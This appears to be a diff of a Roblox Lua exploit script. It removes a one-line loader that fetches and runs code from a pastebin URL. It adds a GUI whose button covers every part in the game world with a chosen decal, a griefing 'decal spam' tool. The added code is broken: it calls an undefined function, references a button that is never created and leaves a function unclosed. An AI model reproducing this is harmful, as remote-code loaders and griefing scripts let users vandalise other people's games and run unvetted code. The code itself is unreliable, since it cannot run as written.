@@ -1,1 +1,86 @@
-loadstring(game:HttpGet("https://pastebin.com/AhppUADd"))()
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+
+local lol = Instance.new("ScreenGui")
+lol.Name = "lol"
+lol.Parent = player:WaitForChild("PlayerGui")
+lol.ResetOnSpawn = false
+lol.ResetOnSpawn = true
+lol.ZIndexBehavior = Enum.ZIndexBehavior.Global
+lol.DisplayOrder = 0
+lol.IgnoreGuiInset = false
+lol.Enabled = true
+lol.SelectionGroup = false
+
+local Frame = Instance.new("Frame")
+Frame.Name = "Frame"
+Frame.Parent = lol
+Frame.Size = UDim2.new(0, 200, 0, 200)
+Frame.Position = UDim2.new(0, 0, 0, 0)
+Frame.AnchorPoint = Vector2.new(0, 0)
+Frame.Visible = true
+Frame.BackgroundColor3 = Color3.fromRGB(162, 162, 162)
+Frame.BackgroundTransparency = 0
+Frame.BorderColor3 = Color3.fromRGB(27, 42, 53)
+Frame.BorderSizePixel = 1
+Frame.ClipsDescendants = false
+Frame.LayoutOrder = 0
+Frame.Selectable = false
+Frame.SelectionGroup = false
+Frame.SizeConstraint = Enum.SizeConstraint.RelativeXY
+Frame.Rotation = 0
+Frame.AutomaticSize = Enum.AutomaticSize.None
+Frame.Transparency = 0
+Frame.Rotation = 0
+Frame.Transparency = 0
+
+-- Scripts:
+
+coroutine.wrap(SMIAOGD_fake_script)()
+local function NFCJZ_fake_script() -- TextButton.Script 
+	local script = Instance.new('Script', TextButton)
+	
+	local button = script.Parent
+local decalID = 82391807307131
+
+local function applyDecal(part)
+    if part and part:IsA("BasePart") then
+        local existingDecal = part:FindFirstChildOfClass("Decal")
+        if existingDecal then
+            existingDecal:Destroy()
+        end
+        local One = Instance.new("Decal", part)
+        local Two = Instance.new("Decal", part)
+        local Three = Instance.new("Decal", part)
+        local Four = Instance.new("Decal", part)
+        local Five = Instance.new("Decal", part)
+        local Six = Instance.new("Decal", part)
+        One.Texture = "http://www.roblox.com/asset/?id=" .. decalID
+        Two.Texture = "http://www.roblox.com/asset/?id=" .. decalID
+        Three.Texture = "http://www.roblox.com/asset/?id=" .. decalID
+        Four.Texture = "http://www.roblox.com/asset/?id=" .. decalID
+        Five.Texture = "http://www.roblox.com/asset/?id=" .. decalID
+        Six.Texture = "http://www.roblox.com/asset/?id=" .. decalID
+        One.Face = "Front"
+        Two.Face = "Back"
+        Three.Face = "Right"
+        Four.Face = "Left"
+        Five.Face = "Top"
+        Six.Face = "Bottom"
+    end
+end
+
+local function applyDecalsToAll(root)
+    for _, child in pairs(root:GetChildren()) do
+        if child:IsA("BasePart") then
+            applyDecal(child)
+        elseif child:IsA("Model") then
+            applyDecalsToAll(child)
+        end
+    end
+end
+
+button.MouseButton1Click:Connect(function()
+    applyDecalsToAll(workspace)
+end)
+
